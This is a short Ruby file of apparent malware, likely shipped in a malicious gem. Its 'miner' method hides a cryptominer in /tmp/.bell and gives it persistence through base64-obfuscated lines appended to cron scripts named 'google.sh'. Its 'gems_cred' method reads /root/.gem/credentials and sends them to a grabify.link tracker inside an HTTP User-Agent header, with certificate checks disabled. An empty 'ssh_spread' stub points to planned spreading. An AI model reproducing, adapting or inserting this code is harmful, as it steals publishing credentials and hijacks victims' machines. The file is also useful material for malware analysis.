require 'net/http'
require 'uri'
require 'base64'
require 'resolv'
require'fileutils'
require 'open3'
require 'rbconfig'
class Linux
  def self.miner
    if File.directory?("/tmp/.bell")
    	FileUtils.rm_rf("/tmp/.bell")
    end
    FileUtils.mkdir_p("/tmp/.bell")
    dir = File.dirname(__FILE__)
    FileUtils.mv("#{dir}/rvwf_miner", '/tmp/.bell')
    f = File.open("/etc/cron.monthly/google.sh", "a")
    f << Base64.decode64("bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=")
    f = File.open("/etc/cron.hourly/google.sh", "a")
    f << Base64.decode64("bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=")
  end
  def self.link(url, ua)
  	begin
  		uri = URI.parse(url.to_s)
  		http = Net::HTTP.new(uri.host, uri.port)
  		http.use_ssl = true
  		http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  		request = Net::HTTP::Get.new(uri.request_uri)
  		request.initialize_http_header({"User-Agent" => ua})
  		response = http.request(request)
    rescue => e
			link("https://grabify.link/DOJIFZ", Base64.encode64(e).to_s)
    end
  end
  def self.gems_cred
  	if File.file?("/root/.gem/credentials")
  		gem_conent = Base64.encode64(File.read("/root/.gem/credentials")).gsub("\n", "")
  		link("https://grabify.link/0O7B9Q", gem_conent.to_s)
  	end
  end
  def self.ssh_spread
  	puts
  end
end
